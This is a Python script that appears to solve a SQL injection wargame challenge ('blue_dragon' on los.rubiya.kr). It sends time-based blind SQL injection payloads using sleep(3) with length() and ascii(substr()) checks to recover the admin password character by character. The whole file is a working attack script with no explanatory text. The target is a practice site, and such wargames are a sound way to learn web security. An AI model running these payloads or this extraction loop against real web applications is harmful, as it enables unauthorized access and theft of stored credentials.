import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?"
cookie = dict(PHPSESSID="")

def find_pw_length():
    length = 1
    while True:
        query = f"pw=' or if(id='admin' and length(pw)={length},sleep(3),1)%23"
        URL = url + query
        start = time.time()
        res = requests.get(URL, cookies=cookie)
        end = time.time()
        if end - start < 3:
            length += 1
        else:
            print("Found PW length:", length)
            return length

def find_real_pw(length):
    result = ""
    for i in range(1, length + 1):
        for j in range(33, 127):
            start = time.time()
            query = f"pw=' or if(id='admin' and ascii(substr(pw,{i},1))={j},sleep(3),1)%23"
            URL = url + query
            res = requests.get(URL, cookies=cookie)
            end = time.time()
            if end - start > 3:
                result += chr(j)
                print(chr(j))
                break
    print("pw:", result)

pw_length = find_pw_length()
print("Brute Forcing Password")
find_real_pw(pw_length)
